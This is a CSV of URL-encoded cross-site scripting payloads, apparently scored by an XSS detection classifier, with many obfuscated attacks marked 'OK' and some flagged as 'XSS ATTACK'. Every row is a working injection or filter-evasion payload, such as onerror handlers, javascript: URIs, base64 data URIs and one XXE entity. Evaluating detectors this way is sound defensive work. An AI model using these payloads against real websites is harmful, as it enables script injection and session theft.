sentence,result,threshold
%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.239136726
%3Ciframe%20%20src%3Dj%26Tab%3Ba%26Tab%3Bv%26Tab%3Ba%26Tab%3Bs%26Tab%3Bc%26Tab%3Br%26Tab%3Bi%26Tab%3Bp%26Tab%3Bt%26Tab%3B%3Aa%26Tab%3Bl%26Tab%3Be%26Tab%3Br%26Tab%3Bt%26Tab%3B%2528%26Tab%3B1%26Tab%3B%2529%3E%3C/iframe%3E,OK,0.000375390053
%3C/ScrIpt%3E%3Cscript%3Eeval%28%3Fa%5C154ert%281%29%3F%29%3B%3C/script%3E,OK,0.0377440453
%3Cscript%5Cx0C%3Ejavascript%3Aalert%281%29%3C/script%3E,XSS ATTACK,0.780062437
%22%3E%3Cimg/%3Fonerror%3Dalert%281%29%20src%3Da%3E,OK,0.0364093184
%22%3E%3Ca%20href%3D%22%5Ba%5Djava%5Bb%5Dscript%5Bc%5D%3Aalert%281%29%22%3EXXX%3C/a%3E,OK,0.0258941054
%22%3E%3Cscript%3E%20var%20a%20%3D%20%22X%22%3B%20alert%281%29%3B%20%3C/script%3E,XSS ATTACK,0.41041705
%22%3E%3CA%20HREF%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html./%22%3EX%3C/A%3E,XSS ATTACK,0.996280074
%26%27%22%3E%5C74%5C163%5C143%5C162%5C151%5C160%5C164%5C76%5C141%5C154%5C145%5C162%5C164%5C50%5C57%5C170%5C163%5C163%5C57%5C51%5C74%5C57%5C163%5C143%5C162%5C151%5C160%5C164%5C76,XSS ATTACK,0.678388834
%22%3E%3Cbody%20language%3Dvbs%20onload%3Dwindow.location%3D%27data%3Atext/html%3Bbase64%2CPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D%27%3E,OK,0.103586018
%27%3E%3Cmarquee%20onScroll%20marquee%20onScroll%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/marquee%20onScroll%3E,OK,0.0209570527
%3Cdiv/onmouseover%3D%27alert%281%29%27%3E%20style%3D%22x%3A%22%3E,XSS ATTACK,0.999475181
%3Cscript%20/%2A%2A%2A/%3E/%2A%2A%2A/confirm%28%27%5CuFF41%5CuFF4C%5CuFF45%5CuFF52%5CuFF54%5Cu1455%5CuFF11%5Cu1450%27%29/%2A%2A%2A/%3C/script%20/%2A%2A%2A/,OK,0.0226577222
%27%3E%3Cimg%20%5Cx12src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.0165607631
%3Cbody%20oninput%3Djavascript%3Aalert%281%29%3E%3Cinput%20autofocus%3E,OK,0.0075212121
%22%3E%3Cimg%20src%3Dxx%3Axx%20onerror%3Dalert%281%29%3E,OK,0.0241551399
%22%3E%3Cobject/data%3D//127.0.0.1%3A3555/xss_serve_payloads/flash.swf,XSS ATTACK,0.629124939
%22%3E%3Cform%3E%3Ctextarea%20%26%2313%3B%20onkeyup%3D%27%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%26%23x28%3B1%26%23x29%3B%27%3E,OK,0.00223624706
expr%5C65%20ss/%2A%5C%26%23x25%3B/ion%5C28URL%3D0%5C29,OK,0.134111464
%27%3E%3Csvg/onload%3Dlocation%3D/java/.source%2B/script/.source%2Blocation.h%20ash%5B1%5D%2B/al/.source%2B/ert/.source%2Blocation.hash%5B2%5D%2B/docu/.source%2B/ment.domain/.source%2Blocation.has%20h%5B3%5D//%23%3A%28%29,OK,0.00131443143
%27%3E%3Cimg%20onerror%3D%26%23x65%3B%26%23x76%3B%26%23x61%3B%26%23x6c%3B%26%23x28%3B%26%23x27%3Bal%26%23x5c%3Bu0065rt%26%23x28%3B1%26%23x29%3B%26%23x27%3B%26%23x29%3B%20src%3Da%3E,OK,0.0430159569
%22%3E%3C/script%3E%3Cimg%20src%20%27//%22%250Aonerror%3Dalert%281%29//,XSS ATTACK,0.942082465
%22%3E%3Ciframe%20src%3D%25%28scriptlet%29s%20%3C,XSS ATTACK,0.932964325
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.038064003
%22%3E%3Ciframe%20srcdoc%3D%22%26LT%3Biframe%26sol%3Bsrcdoc%3D%26amp%3Blt%3Bimg%26sol%3Bsrc%3D%26amp%3Bapos%3B%26amp%3Bapos%3Bonerror%3Djavascript%3Aalert%281%29%26amp%3Bgt%3B%3E%22%3E,OK,0.0503430665
%22%3E%3Cinput%20onblur%3Djavascript%3Aalert%281%29%20autofocus%3E%3Cinput%20autofocus%3E,OK,0.0147249103
%27%3E%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220.1%3B%20URL%3Djavascript%3Avoid%28%29//%3F%3BURL%3Djavascript%3Aalert%281%29//%22%3E,OK,0.048291564
%27%3E%3Cimg%20%5Cx11src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.0167914927
%22%3E%3Ca%20onmouseover%3D%22javascript%3Awindow.onerror%3Dalert%3Bthrow%201%3E,OK,0.0302692056
%22%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.239136726
%22%3E%3CBODY%20ONLOAD%3Djavascript%3Ajavascript%3Aalert%281%29%3E,XSS ATTACK,0.990415215
X%3Cdiv%20style%3D%22xexpression%28alert%281%29%29%22%3EX,OK,0.0105111599
%3Ca%20href%3D%22%5Cx13javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.00419354439
feed%3Ajavascript%3Aalert%281%29,XSS ATTACK,0.971186399
%22%3E%3Cbody%20onfocusin%3Dalert%281%29%3E,OK,0.356977403
%22%3E%3Cimg%20src%3Dxx%3Axx%20onerror%20%3Dalert%281%29%3B%3E,OK,0.022081852
%3Cimg%20src%3D%22x%60%20%60%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.00154936314
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3Cscript%3E%3C/script%3E,OK,0.0793355703
%27%3E%3Ciframe%20src%3D%22javascript%3Ax%3Aalert%281%29%22%3E,XSS ATTACK,0.940087438
%5C%27%3E%3Cscript%3EX%3C%5C/script%3E,XSS ATTACK,0.776793182
%3C/script%20%22//%27//%3E%3Csvg%250Aonload%3Dalert%281%29//%3E,XSS ATTACK,0.803429
%27%3E%3C%21DOCTYPE%20x%5B%3C%21ENTITY%20x%20SYSTEM%20%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.xxe%22%3E%5D%3E%3Cy%3E%26x%3B%3C/y%3E,OK,0.0196996629
%3Ca%20href%3D%22data%3Atext/html%3Bblabla%2C%26%2360%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2332%26%23115%26%23114%26%2399%26%2361%26%2334%26%23104%26%23116%26%23116%26%23112%26%2358%26%2347%26%2347%26%23115%26%23116%26%23101%26%23114%26%23110%26%23101%26%23102%26%2397%26%23109%26%23105%26%23108%26%23121%26%2346%26%23110%26%23101%26%23116%26%2347%26%23102%26%23111%26%23111%26%2346%26%23106%26%23115%26%2334%26%2362%26%2360%26%2347%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2362%26%238203%22%3EClick%20Me%3C/a%3E,OK,0.00394380093
%27%3E%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Bjavascript%26colon%3Balert%281%29%22/%3E%3F,OK,0.00351026654
%27%3E%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%281%29%27%3B%3C/STYLE%3E,XSS ATTACK,0.999582648
%27%3E%3Cstyle/onload%20%20%20%20%3D%20%20%20%20%21-alert%26%23x28%3B1%26%23x29%3B%3E,OK,0.00767457485
%3C/ScrIpt%3E%3Cscript%3Ealert%28%5C%27%5C%5C%5C%5C1%5C%5C%5C%5C%5C%27%29%3C/script%3E,OK,0.0206923485
%27%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.241716564
%27%3E%3Cimg/onerror%3D%5Cx0Ajavascript%3Aalert%281%29%5Cx0Asrc%3Dxxx%3Ax%20/%3E,OK,0.167329699
%22%3E%3Cscript%3Eeval%28%3Fa%5C154ert%281%29%3F%29%3B%3C/script%3E,XSS ATTACK,0.426824331
%22%3E%3Cscript%3Eif%28%22x%5C%22.length%3D%3D1%29%20%7B%20alert%281%29%3B%7D%3C/script%3E,OK,0.0543047786
%22%3E%3Cdiv%20style%3D%22background-image%3A%20url%28javascript%3Aalert%281%29%3B%29%3B%22%3E,OK,0.00361078978
%22%3E%3CIMG%20SRC%3DJaVaScRiPt%3Aalert%28%27X%27%29%3E,XSS ATTACK,0.78980422
%22%3E%3C/plaintext%5C%3E%3C/%7C%5C%3E%3Cplaintext/onmouseover%3Dprompt%281%29,OK,0.0193834305
%27%3E%3Cxml%20id%3D%22X%22%20src%3D%22test.htc%22%3E%3C/xml%3E%3Clabel%20dataformatas%3D%22html%22%20datasrc%3D%22%23X%22%20datafld%3D%22payload%22%3E%3C/label%3E,OK,0.00242099166
data%3Aapplication/x-x509-user-cert%3B%26NewLine%3Bbase64%26NewLine%3B%2CPHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4%3D,XSS ATTACK,0.999233902
%27%3E%3Cimg%20src%3Dx%20%3E%20onerror%3Dalert%281%29%3E,OK,0.0101337135
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E%3B,OK,0.158269942
%28alert%281%29%29.replace%28/.%2B/%2Ceval%29%3B,XSS ATTACK,0.923917055
%3Cimg%5Cx11src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.021905154
%22%3E%3CIMG%20SRC%3D%22javascript%3Aalert%281%29%3B%22,XSS ATTACK,0.915487766
%3CHTML%3E%3CBODY%3E%3C%3Fxml%3Anamespace%20prefix%3D%22t%22%20ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%3E,XSS ATTACK,0.964920044
%3Ca%20href%3D%22%5CxE2%5Cx80%5CxA8javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.051399231
%27%3E%3Cdiv%20id%3D%22div1%22%3E%3Cinput%20value%3D%22%60%60onmouseover%3Dalert%281%29%22%3E%3C/div%3E%20%3Cdiv%20id%3D%22div2%22%3E%3C/div%3E%3Cscript%3Edocument.getElementById%28%22div2%22%29.innerHTML%20%3D%20document.getElementById%28%22div1%22%29.innerHTML%3B%3C/script%3E%3C/div%3E,OK,0.00030490756
%27%3E%3Ca%20href%3D%22%5Cx18javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.029509306
%27%3E%3Cimg%20src%3D%22x%3Aalert%22%20onerror%3D%22eval%28src%252b%27%281%29%27%29%22%3E,OK,0.000934541225
%3Cimg%20src%3D%22x%22%20class%3D%22%27%27onerror%3Dalert%281%29%22%3E,OK,0.0131364167
%27%3E%3Cstyle%3E%3Cimg%20src%3D%22%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29//%22%3E,OK,0.0149099827
%3C/ScrIpt%3E%3Cscript%3E%25%28payload%29s%3C/script%3E%22%3E%3C/embed%3E,OK,0.0159648061
%3Cscript%3E%20var%20a%3D1%27%3B%20alert%281%29%3B%20%3C/script%3E,OK,0.15679431
%3Cimg%20src%3D%22blah%22onmouseover%3D%22alert%281%29%3B%22%3E,OK,0.0223356783
%27%3E%3Cimg%20src%3Dx%20onerror%3Dwindow.open%28%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%22%27%29%3B%3E,OK,0.00830772519
%3C/ScrIpt%3E%3CSCRIPT%3Ea%3D/X/,OK,0.0828157067
%27%3E%3Cdiv/onmouseover%3D%27alert%281%29%27%3E%20style%3D%22x%3A%22%3E,XSS ATTACK,0.898174345
%3C/ScrIpt%3E%3Cscript%3E%28%7Bset/%2A%2A/%24%28%24%29%7B_/%2A%2A/setter%3D%24%2C_%3D1%7D%7D%29.%24%3Dalert%3C/script%3E,OK,0.0112947226
%3Cinput%20onblur%3Djavascript%3Aalert%281%29%20autofocus%3E%3Cinput%20autofocus%3E,OK,0.00246366858
%27%3E%3Cimg%20src%3D%22livescript%3Aalert%281%29%3B%22%3E,OK,0.0105831325
%3C/ScrIpt%3E%3Cscript%3Ealert%28%5C%27%5C%5C/%5C%5C1%5C%5C/%5C%5C%5C%27%29%3C/script%3E,OK,0.0208482742
%3C/ScrIpt%3E%3Cscript%3Ealert%28%27X%27%29%3C/script%3E%3Da,OK,0.0790257752
%3C/ScrIpt%3E%3Cscript%3Ealert%28%22/X%22/%29%3C/script%3E,OK,0.152000576
javascript%3Aalert%281%29//%3C/title%3E%3C/style%3E%3C/script%3E--%3E%22%3Balert%281%29//%2A/alert%281%29/%2A%3Ca%20%27%3Balert%281%29//%5C%27%20onclick%3Dalert%281%29//%3E%20%250D%20%250A%20alert%281%29//,XSS ATTACK,0.989359379
alert%28String.fromCharCode%2875%2C67%2C70%29%29//%22%3Balert%28String.fromCharCode%2875%2C67%2C70%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/SCRIPT%3E,OK,0.00264796615
%27%3E%3C/plaintext%5C%3E%3C/%7C%5C%3E%3Cplaintext/onmouseover%3Dprompt%281%29,OK,0.0198459327
%22%3E%3CSTYLE%3E.X%7Bbackground-image%3Aurl%28%22javascript%3Aalert%281%29%22%29%3B%7D%3C/STYLE%3E,XSS ATTACK,0.963041544
%3Cimg/onerror%3D%5Cx60javascript%3Aalert%281%29%5Cx60src%3Dxxx%3Ax%20/%3E,XSS ATTACK,0.981713414
%5Cu0027%20confirm%281%29%3B%20%5Cu0027,OK,0.0507534146
%27%3E%3CIMG%20DYNSRC%3D%22javascript%3Aalert%28%27X%27%29%22%3E,XSS ATTACK,0.98962307
%3Ca%26%2332%3Bhref%26%2361%3B%26%2391%3B%26%2300%3B%26%2393%3B%22%26%2300%3B%20onmouseover%3Dprompt%26%2340%3B1%26%2341%3B%26%2347%3B%26%2347%3B%22%3EXYZ%3C/a,OK,0.246247798
%22%3E%3Ciframe/src%3D%22data%3Atext/html%3B%26Tab%3Bbase64%26Tab%3B%2CPGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3D%3D%22%3E,XSS ATTACK,0.933064699
%3C/ScrIpt%3E%3Cscript%3E%20function%20a%28%29%20%7B%7D%20%3C/script%3E%20%3Cimg%20src%3D1%20onerror%3D%22a%28%29%3Balert%281%29%22%3E,OK,0.00858873129
%3Cimg/anyjunk/onerror%3Dalert%281%29%20src%3Da%3E,XSS ATTACK,0.998922229
%26apos%3B%3B%20confirm%281%29%3B%20%26apos%3B,OK,0.112547278
%22%3E%3CLINK%20REL%3D%22stylesheet%22%20HREF%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.995344877
%3Ccard%20xmlns%3D%22http%3A//www.wapforum.org/2001/wml%22%3E%3Conevent%20type%3D%22ontimer%22%3E%3Cgo%20href%3D%22javascript%3Aalert%281%29%22/%3E%3C/onevent%3E%3Ctimer%20value%3D%221%22/%3E%3C/card%3E,OK,0.00368347764
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%3C/ScrIpt%3E%3CSCRIPT%3Ea%3D/X/alert%28a.source%29%3C/SCRIPT%3E,OK,0.0359860957
%60%22%27%3E%3Cimg%20src%3D%27%23%5Cx27%20onerror%3Djavascript%3Aalert%281%29%3E,XSS ATTACK,0.713718474
%27%3E%3Cb%20%3Cscript%3Ealert%281%29//%3C/script%3E0%3C/script%3E%3C/b%3E,OK,0.0408203
%27%3E%3Ciframe/src%3D%22data%3Atext/html%3B%26Tab%3Bbase64%26Tab%3B%2CPGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D%22%3E,XSS ATTACK,0.973268509
%26lt%3BOBJECT%20classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%26gt%3B%26lt%3Bparam%20name%3Durl%20value%3Djavascript%3Aalert%281%29%26gt%3B%26lt%3B/OBJECT%26gt%3B,OK,0.0072799623
onload%20CDATA%20%22alert%281%29%22%3E,XSS ATTACK,0.989305496
%3C/ScrIpt%3E%3CSCRIPT%3Ea%3D/X/,OK,0.0828157067
%27%3E%3Ca%20href%3D%22%5CxE3%5Cx80%5Cx80javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0140810311
%27%3E%3Cvideo%20poster%3Djavascript%3Aalert%281%29//%3E%3C/video%3E,OK,0.159711331
%3Cscript%20itworksinallbrowsers%3E/%2A%3Cscript%2A%20%2A/alert%281%29%3C/script,OK,0.345378697
%27%3E%3Ciframe%20onbeforeload%20iframe%20onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/iframe%20onbeforeload%3E,OK,0.0145611465
%3C%21--%5Bif%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%281%29//%5D%3E%20--%3E,OK,0.0055924058
%27%3E%3Cb%20id%3D%22id1%22%20x%3Dbegin0x9fa0end%20%3E%60%27%22%3E%3C/b%3E%3Cscript%3Eif%20%28%21/begin.end/.test%28document.getElementById%28%27id1%27%29.getAttribute%28%27x%27%29%29%29%20%7B%20alert%281%29%3B%7D%3C/script%3E,OK,0.000945478678
%3C/ScrIpt%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.0118615329
%27%3E%3Cscript%5Cx09type%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,OK,0.0868772268
%27%3E%3CScR%3CScRiPt%3EIpT%3Eprompt%281%29%3C%252FsCr%3CScRiPt%3EIpT%3E,XSS ATTACK,0.57454586
%27%3E%3Cembed%20code%3D%25%28scriptlet%29s%3E%3C/embed%3E,XSS ATTACK,0.758487463
%22%3E%3Cimg%20src%3Dx%20%3E%20onerror%3Dalert%281%29%3E,OK,0.0100834668
%3Cscript%20src%3D%22data%3A%5CxE0%5CxA4%5Cx98%2Cjavascript%3Aalert%281%29%22%3E%3C/script%3E,XSS ATTACK,0.718428075
%60%22%27%3E%3Cimg%20src%3Dxxx%3Ax%20onerror%5Cx00%3Djavascript%3Aalert%281%29%3E,XSS ATTACK,0.997735858
%3C/ScrIpt%3E%3Cscript%3EReferenceError.prototype.__defineGetter__%28%27name%27%2C%20function%28%29%7Balert%281%29%7D%29%2Cx%3C/script%3E,OK,0.0154432356
%27%3E%3Ca%20style%3D%22behavior%3Aurl%28%23default%23AnchorClick%29%3B%22%20folder%3D%22javascript%3Aalert%281%29%22%3EXXX%3C/a%3E,OK,0.0835219
%3Cmeta%20http-equiv%3D%22X-UA-Compatible%22%20content%3D%22IE%3D5%22%3E%3Cp%20style%3D%22font-family%3A%27%2C%3Ba%5C%5C22%5C%5C3e%5C%5C3cimg%5C%5C20src%5C%5C3dx%5C%5C20onerror%5C%5C3d%5C%5C61lert%5C%5C28%5C%5C31%5C%5C29%5C%5C3e%3A1%27%22%3Eoh-oh%3C/p%3E,OK,0.0016400218
%27%3E%3Cbody%20onPropertyChange%20body%20onPropertyChange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onPropertyChange%3E,OK,0.0035212934
eval%28%27%5C141%5C154%5C145%5C162%5C164%5C50%5C61%5C51%27%29,XSS ATTACK,0.901056051
%3Ca%20href%3D%22%26%23x6A%26%23x61%26%23x76%26%23x61%26%23x73%26%23x63%26%23x72%26%23x69%26%23x70%26%23x74%26%23x3A%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x33%26%23x31%26%23x2B%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x33%26%23x31%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x35%26%23x62%26%23x27%26%23x5C%26%23x31%26%23x34%26%23x35%26%23x5C%26%23x31%26%23x36%26%23x36%26%23x5C%26%23x31%26%23x34%26%23x31%26%23x5C%26%23x31%26%23x35%26%23x34%26%23x27%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x35%26%23x64%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x32%26%23x38%26%23x27%26%23x5C%26%23x31%26%23x34%26%23x31%26%23x5C%26%23x31%26%23x35%26%23x34%26%23x5C%26%23x31%26%23x34%26%23x35%26%23x5C%26%23x31%26%23x36%26%23x32%26%23x5C%26%23x31%26%23x36%26%23x34%26%23x5C%26%23x35%26%23x30%26%23x5C%26%23x36%26%23x31%26%23x5C%26%23x35%26%23x31%26%23x27%26%23x5C%26%23x75%26%23x30%26%23x30%26%23x32%26%23x39%22%3EX%3C/a%3E,OK,1.08803754e-07
%22%3E%3Cimg/%3Fonerror%3Dalert%281%29%20src%3Da%3E,OK,0.0364093184
%3Csvg%20contentScriptType%3Dtext/vbs%3E%3Cscript%3EMsgBox%2B1,OK,0.0132068992
%27%3E%3CX%20STYLE%3D%22X%3Aexpression%28alert%28%27X%27%29%29%22%3E,XSS ATTACK,0.961190581
%2526%252339%3B-alert%281%29//,XSS ATTACK,0.977226257
%3C/ScrIpt%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.0118615329
%27%3E%3Ca%20href%3D%22j%26%23x26%3B%23x26%23x41%3Bvascript%3Aalert%25252831337%252529%22%3EX%3C/a%3E,XSS ATTACK,0.413878918
%22%20onload%3Dalert%281%29%20%22,OK,0.308698773
%3Csvg%3E%3Cg/onload%3Dalert%281%29//,OK,0.0781942308
%22%3E%3Cb%20%3Cscript%3Ealert%281%29//%3C/script%3E0%3C/script%3E%3C/b%3E,OK,0.0398348272
expr%5C65%20ssion%28URL%3D0%29,OK,0.396321
%3CScriPt%3EALeRt%28%3F%20X%20%3F%29%3C/scriPt%3E,XSS ATTACK,0.98148489
